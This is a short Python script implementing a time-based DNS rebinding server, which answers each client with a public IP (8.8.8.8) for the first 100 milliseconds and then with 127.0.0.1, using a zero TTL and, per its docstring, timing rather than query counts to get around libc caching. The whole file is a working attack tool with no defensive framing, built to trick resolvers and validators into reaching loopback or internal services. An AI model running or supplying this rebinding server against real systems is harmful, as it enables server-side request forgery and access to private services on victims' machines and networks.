#!/usr/bin/env python3
"""
Time-based DNS Rebinding Server
================================
Returns public IP for first 100ms, then private IP.
This works around libc caching by using TIME instead of query count.
"""

import socket
import struct
import time
from collections import defaultdict

PUBLIC_IP = "8.8.8.8"
PRIVATE_IP = "127.0.0.1"
DNS_PORT = 53
SWITCH_TIME_MS = 100  # After 100ms, return private IP

first_query_time = defaultdict(lambda: 0)

def ip_to_bytes(ip):
    return bytes(int(x) for x in ip.split('.'))

def build_response(query, ip):
    response = query[:2]
    response += struct.pack(">H", 0x8180)
    response += struct.pack(">HHHH", 1, 1, 0, 0)
    q_end = 12
    while query[q_end] != 0:
        q_end += 1
    q_end += 5
    response += query[12:q_end]
    response += struct.pack(">H", 0xc00c)
    response += struct.pack(">HH", 1, 1)
    response += struct.pack(">I", 0)  # TTL = 0
    response += struct.pack(">H", 4)
    response += ip_to_bytes(ip)
    return response

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', DNS_PORT))
    
    print("=" * 50)
    print(" Time-based DNS Rebinding Server (port 53)")
    print("=" * 50)
    print(f"First {SWITCH_TIME_MS}ms: {PUBLIC_IP}")
    print(f"After {SWITCH_TIME_MS}ms: {PRIVATE_IP}")
    print("=" * 50)
    
    while True:
        data, addr = sock.recvfrom(512)
        now = time.time() * 1000
        
        client = addr[0]
        if first_query_time[client] == 0:
            first_query_time[client] = now
        
        elapsed = now - first_query_time[client]
        
        if elapsed < SWITCH_TIME_MS:
            ip = PUBLIC_IP
        else:
            ip = PRIVATE_IP
            # Reset for next request
            first_query_time[client] = 0
        
        print(f"Query from {client} (elapsed: {elapsed:.0f}ms) -> {ip}")
        sock.sendto(build_response(data, ip), addr)

if __name__ == "__main__":
    main()
